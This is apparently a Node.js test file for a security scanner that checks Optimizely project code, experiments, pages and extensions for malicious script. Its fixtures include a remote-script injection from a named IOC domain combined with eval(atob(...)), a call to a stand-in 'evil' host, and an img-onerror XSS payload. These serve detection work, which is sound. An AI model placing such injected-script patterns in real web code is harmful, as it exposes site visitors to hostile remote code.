const test = require('node:test');
const assert = require('node:assert/strict');
const { scanCode, scanProject, collectSources } = require('../security');
const { createOptimizelyClient } = require('../optimizely');

test('flags the known IOC domain and atob as critical/high', () => {
  const r = scanCode('var s=document.createElement("script");s.src="https://cdn.1688360.cc/x.js";eval(atob("YWJj"))');
  const rules = r.map(f => f.rule);
  for (const id of ['ioc-domain', 'atob', 'eval', 'script-injection']) assert.ok(rules.includes(id), id);
  assert.ok(r.some(f => f.rule === 'external-url' && f.severity === 'critical'));
});
test('clean project helper code produces no findings', () => {
  assert.deepEqual(scanCode('window.optimizely = window.optimizely || []; window.optimizely.push({type:"user", attributes:{uiCulture:"enus"}}); console.warn("x");'), []);
});
test('allowed hosts are not reported but unknown hosts are low severity', () => {
  const r = scanCode('a("https://www.melaleuca.com/x");b("https://cdn.optimizely.com/y");c("https://evil.example.org/z")');
  assert.deepEqual(r.map(f => f.label), ['External URL: evil.example.org']);
  assert.equal(r[0].severity, 'low');
});
test('collects project JS, experiment custom code, page activation code and extensions', () => {
  const raw = { project: { id: 1, project_javascript: 'a()' }, pages: [{ id: 2, name: 'P', activation_code: 'b()' }], extensions: [{ id: 3, name: 'X', implementation: 'c()' }],
    experiments: [{ id: 4, name: 'E', status: 'running', variations: [{ name: 'V', actions: [{ changes: [{ type: 'custom_code', value: 'd()' }, { type: 'attribute', value: 'plain text' }, { type: 'attribute', value: '<img onerror=alert(1)>' }] }] }] }] };
  const sources = collectSources(raw);
  assert.deepEqual(sources.map(s => s.kind).sort(), ['experiment-code', 'experiment-code', 'extension', 'page-activation', 'project-javascript']);
});
test('scanProject ranks findings and counts them by severity', () => {
  const r = scanProject({ project: { id: 1, project_javascript: 'fetch("/a")' }, experiments: [{ id: 9, name: 'Bad', status: 'paused', archived: true, variations: [{ name: 'V', actions: [{ changes: [{ type: 'custom_code', value: 'atob("x");//1688360.cc' }] }] }] }], pages: [], extensions: [] });
  assert.equal(r.findings[0].severity, 'critical');
  assert.equal(r.findings[0].archived, true);
  assert.ok(r.counts.critical >= 1 && r.counts.high >= 1 && r.counts.medium >= 1);
});
test('client fetches the project, experiments, pages and extensions, tolerating an unavailable extensions endpoint', async () => {
  const seen = [];
  const client = createOptimizelyClient({ token: 't', projectId: '55', spacingMs: 0, fetchImpl: async target => {
    const url = new URL(target); seen.push(url.pathname);
    if (url.pathname.endsWith('/extensions')) return new Response('{}', { status: 404 });
    if (url.pathname.endsWith('/projects/55')) return new Response(JSON.stringify({ id: 55, project_javascript: 'x()' }));
    return new Response('[]');
  } });
  const raw = await client.securitySources();
  assert.equal(raw.project.project_javascript, 'x()');
  assert.deepEqual(raw.extensions, []);
  for (const p of ['/v2/projects/55', '/v2/experiments', '/v2/pages', '/v2/extensions']) assert.ok(seen.includes(p), p);
});
